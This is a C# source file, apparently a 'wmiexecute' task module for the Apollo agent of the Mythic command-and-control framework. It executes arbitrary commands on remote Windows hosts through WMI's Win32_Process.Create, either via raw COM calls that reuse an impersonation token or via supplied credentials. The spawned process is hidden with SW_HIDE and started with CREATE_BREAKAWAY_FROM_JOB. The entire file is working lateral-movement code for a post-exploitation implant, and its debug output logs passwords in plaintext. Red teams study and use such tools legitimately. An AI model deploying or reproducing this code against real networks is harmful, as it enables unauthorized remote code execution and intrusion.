#define COMMAND_NAME_UPPER

#if DEBUG
#define WMIEXECUTE
#endif

#if WMIEXECUTE

using System;
using System.Management;
using System.Runtime.Serialization;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Utils;
using System.Runtime.InteropServices;
using OleViewDotNet.Marshaling;
using OleViewDotNet.Interop;
using System.Security.Principal;
using System.Net;

namespace OleViewDotNet.Interop
{
    [Flags]
    public enum CLSCTX : uint
    {
        REMOTE_SERVER = 0x10,
        ENABLE_CLOAKING = 0x100000
    }

    [Flags]
    public enum EOLE_AUTHENTICATION_CAPABILITIES
    {
        STATIC_CLOAKING = 0x20,
        DYNAMIC_CLOAKING = 0x40
    }

    [Flags]
    public enum RPC_AUTHN_LEVEL
    {
        PKT_PRIVACY = 6
    }

    [Flags]
    public enum RPC_IMP_LEVEL
    {
        IMPERSONATE = 3
    }

    [Flags]
    public enum RPC_C_QOS_CAPABILITIES
    {
        None = 0
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    internal struct COAUTHINFO
    {
        public RpcAuthnService dwAuthnSvc;
        public int dwAuthzSvc;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string pwszServerPrincName;
        public RPC_AUTHN_LEVEL dwAuthnLevel;
        public RPC_IMP_LEVEL dwImpersonationLevel;
        public IntPtr pAuthIdentityData;
        public RPC_C_QOS_CAPABILITIES dwCapabilities;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct MULTI_QI : IDisposable
    {
        private IntPtr pIID;
        public IntPtr pItf;
        public int hr;

        void IDisposable.Dispose()
        {
            Marshal.FreeCoTaskMem(pIID);
            if (pItf != IntPtr.Zero)
            {
                Marshal.Release(pItf);
                pItf = IntPtr.Zero;
            }
        }

        public MULTI_QI(Guid iid)
        {
            pIID = Marshal.AllocCoTaskMem(16);
            Marshal.Copy(iid.ToByteArray(), 0, pIID, 16);
            pItf = IntPtr.Zero;
            hr = 0;
        }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public sealed class COSERVERINFO
    {
        private readonly int dwReserved1;
        [MarshalAs(UnmanagedType.LPWStr)]
        public string pwszName;
        public IntPtr pAuthInfo;
        private readonly int dwReserved2;
    }

    internal static class NativeMethods
    {
        [DllImport("ole32.dll")]
        public static extern int CoCreateInstanceEx(in Guid rclsid, IntPtr punkOuter, CLSCTX dwClsCtx, IntPtr pServerInfo, int dwCount, [In, Out] MULTI_QI[] pResults);
    }

}

namespace OleViewDotNet.Marshaling
{
    public enum RpcAuthnService : int
    {
        None = 0,
        Default = -1,
        GSS_Negotiate = 9,
    }
}

namespace Tasks
{
    public class wmiexecute : Tasking
    {
        // Argument marshaling taking from:
        // https://learn.microsoft.com/en-us/dotnet/framework/interop/default-marshalling-for-objects
        [ComImport]
        [Guid("F309AD18-D86A-11d0-A075-00C04FB68820")]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        public interface IWbemLevel1Login
        {
            [return: MarshalAs(UnmanagedType.Interface)]
            int EstablishPosition(/* ... */);
            int RequestChallenge(/* ... */);
            int WBEMLogin(/* ... */);
            int NTLMLogin([In, MarshalAs(UnmanagedType.LPWStr)] string wszNetworkResource, [In, MarshalAs(UnmanagedType.LPWStr)] string wszPreferredLocale, [In] long lFlags, [In, MarshalAs(UnmanagedType.IUnknown)] Object pCtx, [MarshalAs(UnmanagedType.IUnknown)] ref Object ppNamespace);
        }

        [ComImport]
        [Guid("9556dc99-828c-11cf-a37e-00aa003240c7")]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        public interface IWbemServices
        {
            [return: MarshalAs(UnmanagedType.Interface)]
            int OpenNamespace(/* ... */);
            int CancelAsyncCall(/* ... */);
            int QueryObjectSink(/* ... */);
            int GetObject([MarshalAs(UnmanagedType.BStr)] string strObjectPath, [In] long lFlags, [In, Optional, MarshalAs(UnmanagedType.IUnknown)] Object pCtx, [In, Out, Optional, MarshalAs(UnmanagedType.IUnknown)] ref Object ppObject, [In, Out, Optional, MarshalAs(UnmanagedType.IUnknown)] ref Object ppCallResult);
            int GetObjectAsync(/* ... */);
            int PutClass(/* ... */);
            int PutClassAsync(/* ... */);
            int DeleteClass(/* ... */);
            int DeleteClassAsync(/* ... */);
            int CreateClassEnum(/* ... */);
            int CreateClassEnumAsync(/* ... */);
            int PutInstance(/* ... */);
            int PutInstanceAsync(/* ... */);
            int DeleteInstance(/* ... */);
            int DeleteInstanceAsync(/* ... */);
            int CreateInstanceEnum(/* ... */);
            int CreateInstanceEnumAsync(/* ... */);
            int ExecQuery(/* ... */);
            int ExecQueryAsync(/* ... */);
            int ExecNotificationQuery(/* ... */);
            int ExecNotificationQueryAsync(/* ... */);
            int ExecMethod([MarshalAs(UnmanagedType.BStr)] string strObjectPath, [MarshalAs(UnmanagedType.BStr)] string strMethodName, [In] long lFlags, [In, Optional, MarshalAs(UnmanagedType.IUnknown)] Object pCtx, [In, Optional, MarshalAs(UnmanagedType.IUnknown)] Object pInParams, [In, Out, Optional, MarshalAs(UnmanagedType.IUnknown)] ref Object ppOutParams, [In, Out, Optional, MarshalAs(UnmanagedType.IUnknown)] ref Object ppCallResult);
            int ExecMethodAsync(/* ... */);
        }

        [ComImport]
        [Guid("dc12a681-737f-11cf-884d-00aa004b2e24")]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        public interface IWbemClassObject
        {
            [return: MarshalAs(UnmanagedType.Interface)]
            int GetQualifierSet(/* ... */);
            int Get([In, MarshalAs(UnmanagedType.LPWStr)] string wszName, [In] long lFlags, [In, Out] ref Object pVal, [In, Out, Optional] ref int pType, [In, Out, Optional] ref int plFlavor);
            int Put([In, MarshalAs(UnmanagedType.LPWStr)] string wszName, [In] long lFlags, [In] ref Object pVal, [In, Optional] int Type);
            int Delete(/* ... */);
            int GetNames(/* ... */);
            int BeginEnumeration(/* ... */);
            int Next(/* ... */);
            int EndEnumeration(/* ... */);
            int GetPropertyQualifierSet(/* ... */);
            int Clone(/* ... */);
            int GetObjectText(/* ... */);
            int SpawnDerivedClass(/* ... */);
            int SpawnInstance([In] long lFlags, [MarshalAs(UnmanagedType.IUnknown)] ref Object ppNewInstance);
            int CompareTo(/* ... */);
            int GetPropertyOrigin(/* ... */);
            int InheritsFrom(/* ... */);
            int GetMethod([In, MarshalAs(UnmanagedType.LPWStr)] string wszName, [In] long lFlags, [MarshalAs(UnmanagedType.IUnknown)] ref Object ppInSignature, [MarshalAs(UnmanagedType.IUnknown)] ref Object ppOutSignature);
            int PutMethod(/* ... */);
            int DeleteMethod(/* ... */);
            int BeginMethodEnumeration(/* ... */);
            int NextMethod(/* ... */);
            int EndMethodEnumeration(/* ... */);
            int GetMethodQualifierSet(/* ... */);
            int GetMethodOrigin(/* ... */);
        }

        [DllImport("ole32.dll", CharSet = CharSet.Unicode)]
        public static extern int CoSetProxyBlanket(IntPtr pProxy, RpcAuthnService dwAuthnSvc, RpcAuthnService dwAuthzSvc, IntPtr pServerPrincName, RPC_AUTHN_LEVEL dwAuthLevel, RPC_IMP_LEVEL dwImpLevel, IntPtr pAuthInfo, EOLE_AUTHENTICATION_CAPABILITIES dwCapabilities);

        static bool SetProxyBlanket(IntPtr comObject)
        {
            return CoSetProxyBlanket(comObject, RpcAuthnService.Default, RpcAuthnService.Default, IntPtr.Zero, RPC_AUTHN_LEVEL.PKT_PRIVACY, RPC_IMP_LEVEL.IMPERSONATE, IntPtr.Zero, EOLE_AUTHENTICATION_CAPABILITIES.STATIC_CLOAKING) >= 0;
        }
        static bool SetProxyBlanket(object comObject, Type interfaceType)
        {
            return SetProxyBlanket(Marshal.GetComInterfaceForObject(comObject, interfaceType));
        }

        [DataContract]
        internal struct WmiExecuteParameters
        {
            [DataMember(Name = "host")]
            internal string? HostName;
            [DataMember(Name = "username")]
            internal string? Username;
            [DataMember(Name = "password")]
            internal string? Password;
            [DataMember(Name = "domain")]
            internal string? Domain;
            [DataMember(Name = "command")]
            internal string Command;
        }

        public wmiexecute(IAgent agent, MythicTask data) : base(agent, data)
        {
        }

        public override void Start()
        {
            MythicTaskResponse resp = CreateTaskResponse("", true);
            try
            {
                WmiExecuteParameters parameters = _jsonSerializer.Deserialize<WmiExecuteParameters>(_data.Parameters);
                string? HostName = parameters.HostName?.Trim();
                string? Username = parameters.Username?.Trim();
                string? Password = parameters.Password?.Trim();
                string? Domain = parameters.Domain?.Trim();
                string Command = parameters.Command.Trim();
                if (HostName != null && HostName != "" && (Password == null || Password == ""))
                {
                    // https://gist.github.com/EvanMcBroom/99ea88304faec38d3ed1deefd1aba6f9
                    // Create an object on a remote host.
                    // For the CLSID_WbemLevel1Login object, this requires you to use Administrative credentials.
                    // CLSID_WbemLevel1Login does not allow you to immediately query IWbemLevel1Login so you
                    // must query for IUnknown first.
                    var CLSID_WbemLevel1Login = new Guid("8BC3F05E-D86B-11D0-A075-00C04FB68820");
                    var classContext = CLSCTX.REMOTE_SERVER | CLSCTX.ENABLE_CLOAKING; // ENABLE_CLOAKING makes object creation use our impersonation token
                    var authInfoPtr = Marshal.AllocCoTaskMem(0x100); // Buffer is larger than what is needed
                    var authInfo = new COAUTHINFO()
                    {
                        dwAuthnSvc = RpcAuthnService.Default,
                        dwAuthzSvc = 0,
                        pwszServerPrincName = null,
                        dwAuthnLevel = RPC_AUTHN_LEVEL.PKT_PRIVACY,
                        dwImpersonationLevel = RPC_IMP_LEVEL.IMPERSONATE,
                        pAuthIdentityData = IntPtr.Zero,
                        dwCapabilities = RPC_C_QOS_CAPABILITIES.None
                    };
                    Marshal.StructureToPtr(authInfo, authInfoPtr, false);
                    var serverInfoPtr = Marshal.AllocCoTaskMem(0x100); // Buffer is larger than what is needed
                    var serverInfo = new COSERVERINFO()
                    {
                        pwszName = HostName,
                        pAuthInfo = authInfoPtr
                    };
                    Marshal.StructureToPtr(serverInfo, serverInfoPtr, false);
                    var IID_IUnknown = new Guid("00000000-0000-0000-C000-000000000046"); // CLSID_WbemLevel1Login requires IUnknown to be the first interface queried
                    var multiQi = new MULTI_QI[1];
                    multiQi[0] = new MULTI_QI(IID_IUnknown);
                    var coCreateResult = NativeMethods.CoCreateInstanceEx(CLSID_WbemLevel1Login, IntPtr.Zero, classContext, serverInfoPtr, 1, multiQi);
                    if (coCreateResult >= 0 && multiQi[0].hr == 0)
                    {
                        // We need to set the proxy blanket with either STATIC_CLOAKING or DYNAMIC_CLOAKING on
                        // every interface we acquire to instruct COM to use our current impersonation token
                        SetProxyBlanket(multiQi[0].pItf);
                        var wbemLevel1Login = (IWbemLevel1Login)Marshal.GetObjectForIUnknown(multiQi[0].pItf);
                        SetProxyBlanket(wbemLevel1Login, typeof(IWbemLevel1Login));
                        // Connect to the required WMI namespace
                        object output = null;
                        var result = wbemLevel1Login.NTLMLogin("ROOT\\CIMV2", null, 0, null, ref output);
                        var wbemServices = (IWbemServices)output;
                        SetProxyBlanket(wbemServices, typeof(IWbemServices));
                        // Get an instance of Win32_Process
                        result = wbemServices.GetObject("Win32_Process", 0, null, ref output, null);
                        var win32Process = (IWbemClassObject)output;
                        SetProxyBlanket(win32Process, typeof(IWbemClassObject));
                        // Get the signature (e.g., the definition) of the input parameters.
                        result = win32Process.GetMethod("Create", 0, ref output, null);
                        var inSignature = (IWbemClassObject)output;
                        SetProxyBlanket(inSignature, typeof(IWbemClassObject));
                        inSignature.SpawnInstance(0, ref output);
                        var inParameters = (IWbemClassObject)output;
                        SetProxyBlanket(inParameters, typeof(IWbemClassObject));
                        // Get an instance of Win32_ProcessStartup and use it to set the ProcessStartupInformation
                        // input parameter.
                        result = wbemServices.GetObject("Win32_ProcessStartup", 0, null, ref output, null);
                        inSignature = (IWbemClassObject)output;
                        SetProxyBlanket(inSignature, typeof(IWbemClassObject));
                        inSignature.SpawnInstance(0, ref output);
                        var win32ProcessStartupInstance = (IWbemClassObject)output;
                        SetProxyBlanket(win32ProcessStartupInstance, typeof(IWbemClassObject));
                        var input = (object)5; // SW_HIDE
                        result = win32ProcessStartupInstance.Put("ShowWindow", 0, ref input);
                        input = 0x01000000; // CREATE_BREAKAWAY_FROM_JOB
                        result = win32ProcessStartupInstance.Put("CreateFlags", 0, ref input);
                        input = (object)win32ProcessStartupInstance;
                        result = inParameters.Put("ProcessStartupInformation", 0, ref input);
                        input = (object)Command;
                        result = inParameters.Put("CommandLine", 0, ref input);
                        //input = (object)cwd;
                        //result = inParameters.Put("CurrentDirectory", 0, ref input);
                        // Execute the Win32_Process:Create and show its output parameters.
                        result = wbemServices.ExecMethod("Win32_Process", "Create", 0, null, inParameters, ref output, null);
                        Object processID = null;
                        Object returnValue = null;
                        var outParameters = (IWbemClassObject)output;
                        SetProxyBlanket(outParameters, typeof(IWbemClassObject));
                        outParameters.Get("ProcessId", 0, ref processID);
                        outParameters.Get("ReturnValue", 0, ref returnValue);
                        if (returnValue.ToString() == "0")
                        {
                            resp = CreateTaskResponse($"Command spawned PID ({processID.ToString()}) successfully", true, "success");
                        }
                        else
                        {
                            resp = CreateTaskResponse($"Command spawned PID ({processID.ToString()}) and executed with error code ({returnValue.ToString()})", true, "error");
                        }
                        Marshal.FreeCoTaskMem(authInfoPtr);
                        Marshal.FreeCoTaskMem(serverInfoPtr);
                    }
                    else
                    {
                        resp = CreateTaskResponse($"failed with error code: {coCreateResult}", true, "error");
                    }
                    _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                    return;
                }
                //Original version using wmi v1
                ManagementScope scope = new ManagementScope();
                //executes for remote hosts
                if (string.IsNullOrEmpty(HostName) is false)
                {
                    //set wmi connection options
                    ConnectionOptions options = new ConnectionOptions
                    {
                        EnablePrivileges = true,
                        Authentication = AuthenticationLevel.PacketPrivacy,
                        Impersonation = ImpersonationLevel.Impersonate,
                        Username = string.IsNullOrEmpty(Username) ? null : Username,
                        Password = string.IsNullOrEmpty(Password) ? null : Password,
                        Authority = string.IsNullOrEmpty(Domain) ? null : $"NTLMDOMAIN:{Domain}"
                    };
                    DebugHelp.DebugWriteLine($@"trying to connect to target at: \\{HostName}\root\cimv2");
                    DebugHelp.DebugWriteLine($@"Username: {options.Username}");
                    DebugHelp.DebugWriteLine($@"Password: {Password}");
                    DebugHelp.DebugWriteLine($@"Domain: {options.Authority}");
                    scope = new ManagementScope($@"\\{HostName}\root\cimv2", options);
                    scope.Connect();
                    DebugHelp.DebugWriteLine("Connected to target machine");
                }
                //otherwise we assume the execution is local
                else
                {
                    DebugHelp.DebugWriteLine($@"trying to execute locally");
                }

                //use system management object to execute command
                ObjectGetOptions objectGetOptions = new ObjectGetOptions();
                ManagementPath managementPath = new ManagementPath("Win32_Process");
                ManagementClass processClass = new ManagementClass(scope, managementPath, objectGetOptions);
                ManagementBaseObject inParams = processClass.GetMethodParameters("Create");
                DebugHelp.DebugWriteLine($"Executing command: {Command}");
                inParams["CommandLine"] = Command;


                // Invoke the "Create" method to create the process
                ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);
                //get status code
                uint returnCode = (uint)outParams["returnValue"];
                DebugHelp.DebugWriteLine($"Return code: {returnCode}");
                if (returnCode != 0)
                {
                    resp = CreateTaskResponse($"Command failed with return code: {returnCode}", true, "error");
                }
                else
                {
                    resp = CreateTaskResponse("Command executed successfully", true);
                }
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }
            catch (Exception e)
            {
                resp = CreateTaskResponse(e.Message + "\n" + e.StackTrace, true, "error");
                DebugHelp.DebugWriteLine(e.Message);
                DebugHelp.DebugWriteLine(e.StackTrace);
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }

        }
    }
}

#endif